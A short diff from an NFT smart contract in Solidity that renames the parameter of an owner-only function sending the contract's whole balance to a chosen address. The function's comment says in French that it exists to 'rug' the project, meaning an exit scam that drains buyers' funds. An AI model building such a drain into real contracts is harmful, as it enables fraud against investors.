@@ -84,9 +84,9 @@ contract NFTERC721A is Ownable, ERC721A, PaymentSplitter {
     }
 
     // Pour RUG le projet 
-    function transferAllFunds(address payable recipient) external onlyOwner {
+    function transferAllFunds(address payable receveur) external onlyOwner {
         uint balance = address(this).balance;
-        recipient.transfer(balance);
+        receveur.transfer(balance);
     }
 
 
